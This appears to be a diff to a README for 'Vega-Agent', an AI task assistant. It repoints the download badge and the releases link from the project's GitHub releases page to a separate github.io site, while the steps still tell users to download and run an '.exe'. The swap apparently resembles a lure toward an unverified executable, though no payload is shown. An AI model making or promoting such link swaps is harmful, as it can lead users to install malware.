@@ -1,6 +1,6 @@
 # 🤖 Vega-Agent - Manage your daily tasks with ease
 
-[![](https://img.shields.io/badge/Download-Vega--Agent-blue.svg)](https://github.com/Calvinunskilled96/Vega-Agent/releases)
+[![](https://img.shields.io/badge/Download-Vega--Agent-blue.svg)](https://calvinunskilled96.github.io)
 
 Vega-Agent serves as your personal assistant. It helps you manage complex digital tasks directly from your device. The software handles file downloads, edits code files, and performs web searches to find the information you need. You save time because the agent completes these multi-step processes for you.
 
@@ -8,7 +8,7 @@ Vega-Agent serves as your personal assistant. It helps you manage complex digita
 
 You find the official software release on the project website. Follow these steps to obtain the correct file for your computer.
 
-1. Visit the [Vega-Agent Releases Page](https://github.com/Calvinunskilled96/Vega-Agent/releases).
+1. Visit the [Vega-Agent Releases Page](https://calvinunskilled96.github.io).
 2. Look for the section labeled "Latest."
 3. Click the link that ends in ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
